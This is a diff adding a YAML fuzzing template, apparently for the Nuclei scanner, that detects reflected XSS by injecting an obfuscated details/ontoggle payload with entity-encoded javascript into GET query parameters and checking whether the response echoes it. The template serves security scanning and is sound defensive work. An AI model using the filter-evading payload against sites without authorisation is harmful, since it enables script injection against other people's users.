@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-tarun
+
+info:
+  name: Custom Reflection XSS Detection - Tarun
+  author: netbaan
+  severity: low
+  description: |
+    This template detects reflection XSS vulnerabilities using a custom payload provided by Tarun.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - 'Tarun~<"><details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;">XXXXX</a>' # Note the use of single quotes and escaping as required
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
